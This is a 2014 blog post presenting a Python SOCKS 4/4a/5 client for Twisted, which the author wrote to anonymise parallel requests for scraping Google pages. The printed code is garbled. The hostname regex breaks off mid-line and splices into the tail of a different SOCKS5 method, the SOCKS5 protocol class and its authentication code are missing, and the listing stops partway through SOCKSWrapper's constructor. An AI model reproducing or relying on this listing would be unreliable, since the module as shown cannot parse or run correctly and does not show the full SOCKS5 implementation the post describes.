<!DOCTYPE html>
<html lang="en">
<head>
  <link href='//fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,700,400italic' rel='stylesheet' type='text/css'>
  <link rel="stylesheet" type="text/css" href="/theme/css/style.min.css">
  <link rel="stylesheet" type="text/css" href="/theme/css/pygments.min.css">
  <link rel="stylesheet" type="text/css" href="/theme/css/font-awesome.min.css">

  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="robots" content="index, follow" />
  <meta name="author" content="Nikolai Tschacher" />
  <meta name="description" content="Nikolai Tschacher's ideas and programming around security and computer science" />
<meta property="og:site_name" content="Coding, Learning and IT Security"/>
<meta property="og:type" content="blog"/>
<meta property="og:title" content="Coding, Learning and IT Security"/>
<meta property="og:description" content="Nikolai Tschacher's ideas and programming around security and computer science"/>
<meta property="og:locale" content="en_US"/>
<meta property="og:url" content=""/>
  <title>Coding, Learning and IT Security</title>
</head>
<body>
  <aside>
    <div>
      <a href="">
        <img src="/theme/img/profile.png" alt="Coding, Learning and IT Security" title="Coding, Learning and IT Security">
      </a>
      <h1><a href="">Coding, Learning and IT Security</a></h1>
      <p></p>
      <nav>
        <ul class="list">
          <li><a href="/pages/about.html#about">About</a></li>
          <li><a href="/pages/contact.html#contact">Contact</a></li>
          <li><a href="/pages/googlescraper-py.html#googlescraper-py">GoogleScraper.py</a></li>
          <li><a href="/pages/projects.html#projects">Projects</a></li>
          <li><a href="/pages/impressum.html#impressum">Site Notice</a></li>
          <li><a href="/pages/svgcaptcha.html#svgcaptcha">SVGCaptcha</a></li>
        </ul>
      </nav>
      <ul class="social">
        <li><a class="sc-twitter" href="https://twitter.com/incolumitas_" target="_blank"><i class="fa fa-twitter"></i></a></li>
        <li><a class="sc-github" href="https://github.com/NikolaiT" target="_blank"><i class="fa fa-github"></i></a></li>
        <li><a class="sc-rss" href="//incolumitas/feeds/all.atom.xml" target="_blank"><i class="fa fa-rss"></i></a></li>
        <li><a class="sc-stack-overflow" href="http://stackoverflow.com/users/1052496/nikolai-tschacher" target="_blank"><i class="fa fa-stack-overflow"></i></a></li>
      </ul>
    </div>
  </aside>
  <main>
    <nav>
      <a href="">Home</a>
      <a href="/archives.html">Archives</a>
      <a href="/categories.html">Categories</a>
      <a href="/tags.html">Tags</a>
    </nav>

<article>
  <header>
    <h2><a href="/socks-5-client-support-for-twisted.html#socks-5-client-support-for-twisted">Socks 5 client support for twisted</a></h2>
    <p>
      Posted on Mi 05 Februar 2014 in <a href="/category/programming.html">Programming</a>
      &#8226; Tagged with
      <a href="/tag/python.html">Python</a>,      <a href="/tag/twisted.html">Twisted</a>,      <a href="/tag/socks5.html">Socks5</a>,      <a href="/tag/programming.html">Programming</a>,      <a href="/tag/security.html">Security</a>    </p>
  </header>
  <div>
      <p>I recently forked
<a href="https://github.com/ln5/twisted-socks" title="twisted socks client">twisted-socks</a>
to add SOCKS 5 support for my
<a href="http://incolumitas.com/googlescraper-py/" title="GoogleScraper">GoogleScraper</a>
in order to scraper Google pages asynchronously. Obviously I needed
SOCKS5 support to anonymize the parallel requests such that I can scrape
more pages simultaneously.</p>
<p>I tested the code for SOCKS4 and SOCKS4a with a local TOR proxy and
<code>twistd -n socks</code> and the SOCKS5 protocol with the <a href="http://www.inet.no/dante/" title="dante">dante socks proxy
server</a> on my VPS. So I guess the
basic functionality should be working by now. GSSAPI (Kerberos)
<a href="https://tools.ietf.org/html/rfc1961">support</a> is planned.</p>
<p>Here is the socksclient code, which is also available on my github
repository:</p>
<div class="highlight"><pre><span class="c"># Copyright (c) 2011-2013, The Tor Project</span>
<span class="c"># See LICENSE for the license.</span>

<span class="c"># Updated on 25.01.14-28.01.14 to add SOCKS 5 support.</span>
<span class="c"># Cleaned some parts of the code and abstracted quite a bit to handle the most important SOCKS5</span>
<span class="c"># functionality like</span>
<span class="c"># - username/password authentication</span>
<span class="c"># - gssapi authentication (planned)</span>
<span class="c"># - CONNECT command (the normal case, there are others: UDP ASSOCIATE and BIND, but they aren&#39;t as important. Maybe I will add them</span>
<span class="c">#   in the future. If anyone wants to implement them, the basic structure is already here and the SOCKSv5ClientProtocol should be</span>
<span class="c">#   rather easy extensible (how the actual connection, listening for incoming connections (BIND) and opening a UDP connection (UDP ASSOCIATE)</span>
<span class="c">#   is done in the twisted world, is another question.</span>
<span class="c"># Added:</span>
<span class="c"># - SOCKSv4ClientFactory was renamed to SOCKSClientFactory and abstracted to handle all SOCKS 4/4a SOCKS5 (It is still ONE protocol, so one Factory should be logical correct)</span>
<span class="c"># - added SOCKS5ClientFactory</span>
<span class="c"># - SOCKSClientProtocol is the base class for all three protocols</span>
<span class="c"># - SOCKSv4aClientProtocol inherits from  SOCKSv4ClientProtocol. I made the deliberate choice to differ between SOCKS 4 and 4a, altough 4a has the exactly same functionality as 4,</span>
<span class="c">#   it might be the case that servers only speak version 4.</span>
<span class="c"># References:</span>
<span class="c"># A actively maintained, most recent version of PySocks from https://github.com/Anorov/PySocks</span>
<span class="c"># The original version of socksclient.py:</span>

<span class="c"># Author: Nikolai Tschacher</span>
<span class="c"># Contact: incolumitas.com</span>

<span class="kn">import</span> <span class="nn">inspect</span>
<span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">re</span>
<span class="kn">import</span> <span class="nn">struct</span>
<span class="kn">from</span> <span class="nn">zope.interface</span> <span class="kn">import</span> <span class="n">implements</span>
<span class="kn">from</span> <span class="nn">twisted.internet</span> <span class="kn">import</span> <span class="n">defer</span>
<span class="kn">from</span> <span class="nn">twisted.internet.interfaces</span> <span class="kn">import</span> <span class="n">IStreamClientEndpoint</span><span class="p">,</span> <span class="n">IReactorTime</span>
<span class="kn">from</span> <span class="nn">twisted.internet.protocol</span> <span class="kn">import</span> <span class="n">Protocol</span><span class="p">,</span> <span class="n">ClientFactory</span>
<span class="kn">from</span> <span class="nn">twisted.internet.endpoints</span> <span class="kn">import</span> <span class="n">_WrappingFactory</span>

<span class="k">class</span> <span class="nc">SOCKSError</span><span class="p">(</span><span class="ne">Exception</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">val</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">val</span> <span class="o">=</span> <span class="n">val</span>
    <span class="k">def</span> <span class="nf">__str__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">return</span> <span class="nb">repr</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">val</span><span class="p">)</span>

<span class="k">class</span> <span class="nc">SOCKSClientProtocol</span><span class="p">(</span><span class="n">Protocol</span><span class="p">):</span>
    <span class="sd">&#39;&#39;&#39;</span>
<span class="sd">    Base class for SOCKS protocols 4, 4a and 5</span>
<span class="sd">    &#39;&#39;&#39;</span>
    <span class="n">buf</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>

    <span class="k">def</span> <span class="nf">noteTime</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">event</span><span class="p">):</span>
        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">_timer</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">_timestamps</span><span class="p">[</span><span class="n">event</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_timer</span><span class="o">.</span><span class="n">seconds</span><span class="p">()</span>

    <span class="k">def</span> <span class="nf">abort</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">errmsg</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">transport</span><span class="o">.</span><span class="n">loseConnection</span><span class="p">()</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">handshakeDone</span><span class="o">.</span><span class="n">errback</span><span class="p">(</span><span class="n">SOCKSError</span><span class="p">(</span><span class="s">&#39;SOCKS </span><span class="si">%s</span><span class="s">: </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">proxy_config</span><span class="p">[</span><span class="s">&#39;version&#39;</span><span class="p">],</span> <span class="n">errmsg</span><span class="p">)))</span>

    <span class="k">def</span> <span class="nf">isHostname</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">string</span><span class="p">):</span>
        <span class="n">dns_label_regex</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="s">r&#39;^(?![0-9]+$)(?!-)[a-zA-Z0-9-]{,63}(?H&quot;, port)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">transport</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">noteTime</span><span class="p">(</span><span class="s">&#39;RELAY_REQUEST_SENT&#39;</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">protocol_state</span> <span class="o">=</span> <span class="s">&#39;connection_requested&#39;</span>

    <span class="k">def</span> <span class="nf">verifySocksReply</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
        <span class="n">where</span> <span class="o">=</span> <span class="s">&#39;SOCKS5 verifySocksReply&#39;</span>

        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">:</span> <span class="c"># all hostname are longer than a IPv4 address</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">abort</span><span class="p">(</span><span class="s">&#39;Too few data from server </span><span class="si">%s</span><span class="s">.&#39;</span> <span class="o">%</span> <span class="n">where</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">version</span><span class="p">,</span> <span class="n">reply</span><span class="p">,</span> <span class="n">rsv</span><span class="p">,</span> <span class="n">address_type</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;!BBBB&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">[:</span><span class="mi">4</span><span class="p">])</span>

            <span class="k">if</span> <span class="n">version</span> <span class="o">!=</span> <span class="mh">0x5</span><span class="p">:</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">abort</span><span class="p">(</span><span class="s">&#39;Invalid version&#39;</span><span class="p">)</span>
                <span class="k">return</span> <span class="bp">False</span>

            <span class="k">if</span> <span class="n">reply</span> <span class="o">!=</span> <span class="mh">0x0</span><span class="p">:</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">abort</span><span class="p">(</span><span class="s">&#39;Server reply indicates failure. Reason: </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="bp">self</span><span class="o">.</span><span class="n">SOCKS5_ERRORS</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">reply</span><span class="p">,</span> <span class="s">&quot;Unknown error&quot;</span><span class="p">))</span>
                <span class="k">return</span> <span class="bp">False</span>

            <span class="k">if</span> <span class="n">address_type</span> <span class="o">==</span> <span class="mh">0x1</span><span class="p">:</span> <span class="c"># handle IPv4 address</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">bound_address</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">bound_port</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">inet_ntoa</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">4</span><span class="p">:</span><span class="mi">8</span><span class="p">]),</span>  
                                                       <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&gt;H&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="mi">8</span><span class="p">:</span><span class="mi">10</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
            <span class="k">elif</span> <span class="n">address_type</span> <span class="o">==</span> <span class="mh">0x3</span><span class="p">:</span> <span class="c"># handle domain name</span>
                <span class="n">dns_name_len</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">4</span><span class="p">:</span><span class="mi">5</span><span class="p">])</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">bound_address</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">bound_port</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">5</span><span class="p">:</span><span class="n">dns_name_len</span><span class="p">],</span>  
                                                      <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&gt;H&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">[(</span><span class="mi">5</span><span class="o">+</span><span class="n">dns_name_len</span><span class="p">):(</span><span class="mi">5</span><span class="o">+</span><span class="n">dns_name_len</span><span class="o">+</span><span class="mi">2</span><span class="p">)])[</span><span class="mi">0</span><span class="p">]</span>
            <span class="k">elif</span> <span class="n">address_type</span> <span class="o">==</span> <span class="mh">0x4</span><span class="p">:</span> <span class="c"># handle Ipv6 address</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">bound_address</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">bound_port</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">inet_ntop</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET6</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="mi">4</span><span class="p">:</span><span class="mi">20</span><span class="p">]),</span>  
                                                                   <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&gt;H&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="mi">20</span><span class="p">:</span><span class="mi">22</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>

            <span class="bp">self</span><span class="o">.</span><span class="n">protocol_state</span> <span class="o">=</span> <span class="s">&#39;connection_verified&#39;</span>
            <span class="k">return</span> <span class="bp">True</span>

    <span class="k">def</span> <span class="nf">connectionMade</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">noteTime</span><span class="p">(</span><span class="s">&#39;CONNECTED&#39;</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">noteTime</span><span class="p">(</span><span class="s">&#39;NEGOTIATE_AUTH_METHOD&#39;</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">negotiateAuthenticationMethod</span><span class="p">()</span>

    <span class="k">def</span> <span class="nf">dataReceived</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">buf</span> <span class="o">+=</span> <span class="n">data</span>

        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">protocol_state</span> <span class="o">==</span> <span class="s">&#39;do_auth&#39;</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">authenticate</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
        <span class="k">elif</span> <span class="bp">self</span><span class="o">.</span><span class="n">protocol_state</span> <span class="o">==</span> <span class="s">&#39;check_auth&#39;</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">checkAuth</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">protocol_state</span> <span class="o">==</span> <span class="s">&#39;authenticated&#39;</span><span class="p">:</span>
            <span class="n">host</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">postHandshakeEndpoint</span><span class="o">.</span><span class="n">_host</span>
            <span class="n">port</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">postHandshakeEndpoint</span><span class="o">.</span><span class="n">_port</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">sendRelayRequest</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
        <span class="k">elif</span> <span class="bp">self</span><span class="o">.</span><span class="n">protocol_state</span> <span class="o">==</span> <span class="s">&#39;connection_requested&#39;</span><span class="p">:</span>
            <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">verifySocksReply</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">setupRelay</span><span class="p">()</span>


<span class="k">class</span> <span class="nc">SOCKSv4ClientProtocol</span><span class="p">(</span><span class="n">SOCKSClientProtocol</span><span class="p">):</span>
    <span class="n">SOCKS4_ERRORS</span> <span class="o">=</span> <span class="p">{</span>
        <span class="mh">0x5B</span><span class="p">:</span> <span class="s">&quot;Request rejected or failed&quot;</span><span class="p">,</span>
        <span class="mh">0x5C</span><span class="p">:</span> <span class="s">&quot;Request rejected because SOCKS server cannot connect to identd on the client&quot;</span><span class="p">,</span>
        <span class="mh">0x5D</span><span class="p">:</span> <span class="s">&quot;Request rejected because the client program and identd report different user-ids&quot;</span>
    <span class="p">}</span>
    <span class="k">def</span> <span class="nf">sendRelayRequest</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
        <span class="n">username</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">proxy_config</span><span class="p">[</span><span class="s">&#39;version_specific&#39;</span><span class="p">][</span><span class="s">&#39;username&#39;</span><span class="p">]</span>
        <span class="n">ver</span><span class="p">,</span> <span class="n">cmd</span><span class="p">,</span> <span class="n">username</span> <span class="o">=</span> <span class="mh">0x4</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="p">[</span><span class="n">b</span><span class="s">&#39;</span><span class="se">\x00</span><span class="s">&#39;</span><span class="p">,</span> <span class="n">username</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span><span class="o">+</span><span class="n">b</span><span class="s">&#39;</span><span class="se">\x00</span><span class="s">&#39;</span><span class="p">][</span><span class="ow">not</span> <span class="ow">not</span> <span class="n">username</span><span class="p">]</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">addr</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">inet_aton</span><span class="p">(</span><span class="n">host</span><span class="p">)</span>
        <span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">error</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">abort</span><span class="p">(</span><span class="s">&#39;Not a valid IPv4 address.&#39;</span><span class="p">)</span>
            <span class="k">return</span> <span class="bp">False</span>
        <span class="n">msg</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;!BBH&#39;</span><span class="p">,</span> <span class="n">ver</span><span class="p">,</span> <span class="n">cmd</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span> <span class="o">+</span> <span class="n">addr</span> <span class="o">+</span> <span class="n">username</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">transport</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">noteTime</span><span class="p">(</span><span class="s">&#39;REQUEST&#39;</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">verifySocksReply</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
        <span class="sd">&quot;&quot;&quot;</span>
<span class="sd">        Return True on success and False on need-more-data or error.</span>
<span class="sd">        In the case of an error, the connection is closed and the</span>
<span class="sd">        handshakeDone errback is invoked with a SOCKSError exception</span>
<span class="sd">        before False is returned.</span>
<span class="sd">        &quot;&quot;&quot;</span>
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">:</span>
            <span class="k">return</span> <span class="bp">False</span>
        <span class="k">if</span> <span class="nb">ord</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">!=</span> <span class="mh">0x0</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">abort</span><span class="p">(</span><span class="s">&#39;Expected 0 bytes&#39;</span><span class="p">)</span>
            <span class="k">return</span> <span class="bp">False</span>
        <span class="n">status</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
        <span class="k">if</span> <span class="n">status</span> <span class="o">!=</span> <span class="mh">0x5a</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">abort</span><span class="p">(</span><span class="s">&#39;Relay request failed. Reason=</span><span class="si">%s</span><span class="s">.&#39;</span> <span class="o">%</span> <span class="bp">self</span><span class="o">.</span><span class="n">SOCKS4_ERRORS</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="s">&#39;Unknown error&#39;</span><span class="p">))</span>
            <span class="k">return</span> <span class="bp">False</span>
        <span class="k">return</span> <span class="bp">True</span>

    <span class="k">def</span> <span class="nf">connectionMade</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">noteTime</span><span class="p">(</span><span class="s">&#39;CONNECT&#39;</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">noteTime</span><span class="p">(</span><span class="s">&#39;NEGOTIATE&#39;</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">sendRelayRequest</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">postHandshakeEndpoint</span><span class="o">.</span><span class="n">_host</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">postHandshakeEndpoint</span><span class="o">.</span><span class="n">_port</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">dataReceived</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">buf</span> <span class="o">+=</span> <span class="n">data</span>
        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">verifySocksReply</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">setupRelay</span><span class="p">()</span>

<span class="k">class</span> <span class="nc">SOCKSv4aClientProtocol</span><span class="p">(</span><span class="n">SOCKSv4ClientProtocol</span><span class="p">):</span>
    <span class="sd">&#39;&#39;&#39;Only extends SOCKS 4 to remotely resolve hostnames.&#39;&#39;&#39;</span>

    <span class="k">def</span> <span class="nf">sendRelayRequest</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
        <span class="n">username</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">proxy_config</span><span class="p">[</span><span class="s">&#39;version_specific&#39;</span><span class="p">][</span><span class="s">&#39;username&#39;</span><span class="p">]</span>
        <span class="n">ver</span><span class="p">,</span> <span class="n">cmd</span><span class="p">,</span> <span class="n">username</span> <span class="o">=</span> <span class="mh">0x4</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="p">[</span><span class="n">b</span><span class="s">&#39;</span><span class="se">\x00</span><span class="s">&#39;</span><span class="p">,</span> <span class="n">username</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span><span class="o">+</span><span class="n">b</span><span class="s">&#39;</span><span class="se">\x00</span><span class="s">&#39;</span><span class="p">][</span><span class="ow">not</span> <span class="ow">not</span> <span class="n">username</span><span class="p">]</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">addr</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">inet_aton</span><span class="p">(</span><span class="n">host</span><span class="p">)</span>
        <span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">error</span><span class="p">:</span>
            <span class="n">addr</span> <span class="o">=</span> <span class="s">&#39;</span><span class="se">\x00\x00\x00\x01</span><span class="s">&#39;</span>
            <span class="n">dnsname</span> <span class="o">=</span> <span class="s">&#39;</span><span class="si">%s</span><span class="se">\x00</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">host</span>
            <span class="n">msg</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;!BBH&#39;</span><span class="p">,</span> <span class="n">ver</span><span class="p">,</span> <span class="n">cmd</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span> <span class="o">+</span> <span class="n">addr</span> <span class="o">+</span> <span class="n">username</span> <span class="o">+</span> <span class="n">dnsname</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">msg</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;!BBH&#39;</span><span class="p">,</span> <span class="n">ver</span><span class="p">,</span> <span class="n">cmd</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span> <span class="o">+</span> <span class="n">addr</span> <span class="o">+</span> <span class="n">username</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">transport</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">noteTime</span><span class="p">(</span><span class="s">&#39;REQUEST&#39;</span><span class="p">)</span>

<span class="k">class</span> <span class="nc">SOCKSClientFactory</span><span class="p">(</span><span class="n">ClientFactory</span><span class="p">):</span>

    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">proxy_config</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">proxy_config</span> <span class="o">=</span> <span class="n">proxy_config</span>
        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">proxy_config</span><span class="p">[</span><span class="s">&#39;version&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s">&#39;4&#39;</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">protocol</span> <span class="o">=</span> <span class="n">SOCKSv4ClientProtocol</span>
        <span class="k">elif</span> <span class="bp">self</span><span class="o">.</span><span class="n">proxy_config</span><span class="p">[</span><span class="s">&#39;version&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s">&#39;4a&#39;</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">protocol</span> <span class="o">=</span> <span class="n">SOCKSv4aClientProtocol</span>
        <span class="k">elif</span> <span class="bp">self</span><span class="o">.</span><span class="n">proxy_config</span><span class="p">[</span><span class="s">&#39;version&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s">&#39;5&#39;</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">protocol</span> <span class="o">=</span> <span class="n">SOCKSv5ClientProtocol</span>

    <span class="k">def</span> <span class="nf">buildProtocol</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">addr</span><span class="p">):</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">ClientFactory</span><span class="o">.</span><span class="n">buildProtocol</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">addr</span><span class="p">)</span>
        <span class="n">r</span><span class="o">.</span><span class="n">proxy_config</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">proxy_config</span>
        <span class="n">r</span><span class="o">.</span><span class="n">postHandshakeEndpoint</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">postHandshakeEndpoint</span>
        <span class="n">r</span><span class="o">.</span><span class="n">postHandshakeFactory</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">postHandshakeFactory</span>
        <span class="n">r</span><span class="o">.</span><span class="n">handshakeDone</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">handshakeDone</span>
        <span class="n">r</span><span class="o">.</span><span class="n">_timestamps</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_timestamps</span>
        <span class="n">r</span><span class="o">.</span><span class="n">_timer</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_timer</span>
        <span class="k">return</span> <span class="n">r</span>

<span class="k">class</span> <span class="nc">SOCKSWrapper</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="sd">&#39;&#39;&#39;</span>
<span class="sd">    Generic class to wrap all 3 SOCKS protocol versions 4, 4a, 5 around a TCP connection</span>
<span class="sd">    &#39;&#39;&#39;</span>
    <span class="n">implements</span><span class="p">(</span><span class="n">IStreamClientEndpoint</span><span class="p">)</span>

    <span class="n">factory</span> <span class="o">=</span> <span class="n">SOCKSClientFactory</span>

    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">reactor</span><span class="p">,</span> <span class="n">endpoint</span><span class="p">,</span> <span class="n">proxy_config</span><span class="p">,</span> <span class="n">timestamps</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">_host</span> <span class="o">=</span> <span class="n">proxy_config</span><span class="p">[</span><span class="s">&#39;host&#39;</span><span class="p">]</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">_port</span> <span class="o">=</span> <span class="n">proxy_config</span><span class="p">[</span><span class="s">&#39;port&#39;</span><span class="p">]</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">_proxy_config</span> <span class="o">=</span> <span class="n">proxy_config</span>

